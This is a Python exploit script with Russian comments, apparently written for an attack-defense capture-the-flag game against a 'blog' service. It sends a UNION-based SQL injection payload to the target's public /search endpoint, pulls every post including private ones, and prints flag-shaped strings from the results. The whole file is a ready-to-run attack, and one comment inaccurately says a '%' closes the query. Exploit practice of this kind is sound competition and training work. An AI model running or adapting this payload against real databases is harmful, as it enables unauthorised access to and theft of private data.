#!/usr/bin/env python3
"""blog — SQL-инъекция в публичном /search. Кавычкой закрываем LIKE, UNION'ом
добавляем ВСЕ посты (в т.ч. приватные с флагами), хвост режем комментарием.
Запуск: blog.py <ip_жертвы> [порт]  (флаги построчно в stdout)."""
import os
import re
import sys

import requests

FLAG = re.compile(os.environ.get("FLAG_FORMAT", r"[A-Z0-9]{31}="))
HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else int(os.environ.get("PORT", "5004"))
BASE = f"http://{HOST}:{PORT}"

# '%' закрывает исходный LIKE, UNION добавляет все посты, '--' комментирует хвост ("%'").
PAYLOAD = "' UNION SELECT id,title,body FROM posts-- "

flags = set()
try:
    r = requests.get(f"{BASE}/search", params={"q": PAYLOAD}, timeout=5)
    for row in r.json().get("results", []):
        flags.update(FLAG.findall(str(row.get("body", ""))))
except (requests.RequestException, ValueError):
    pass

for f in sorted(flags):
    print(f)
